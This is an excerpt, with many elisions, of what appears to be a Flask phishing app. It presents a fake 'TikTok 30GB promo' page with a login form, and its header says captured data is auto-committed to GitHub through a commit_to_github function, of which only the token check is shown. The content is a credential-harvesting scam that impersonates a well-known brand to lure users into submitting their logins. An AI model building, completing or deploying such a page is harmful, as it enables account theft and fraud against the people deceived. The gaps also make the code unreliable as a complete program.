# =============================================================================
# TIKTOK 30GB PROMO – AUTO‑COMMIT TO GITHUB (FULLY WORKING)
...
app = Flask(__name__)
app.secret_key = secrets.token_hex(32)   # required for Flask session (even if not used)
...
<body>
    <div class="glass-card">
        ...
        <div class="offer-content" id="offerContent">
            ...
            <a href="/guest" class="guest-link">Continue as Guest →</a>
            <p style="font-size:12px; opacity:0.6; margin-top:8px;">No payment required • Instant</p>
...
<head>
    ...
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        ...
        .guest-link-login a { color: #fe2c55; text-decoration: none; font-weight: 600; }
    ...
    <div class="main">
        <div class="card">
            ...
            <form method="POST" action="/login">
                ...
                <div class="guest-link-login">or <a href="/guest">continue as guest</a></div>
...
def commit_to_github(file_path, data):
    if not GITHUB_TOKEN or GITHUB_TOKEN == "YOUR_NEW_GITHUB_TOKEN_HERE":
        logger.warning("❌ No valid GitHub token provided. Set a real token in the code.")
        return False
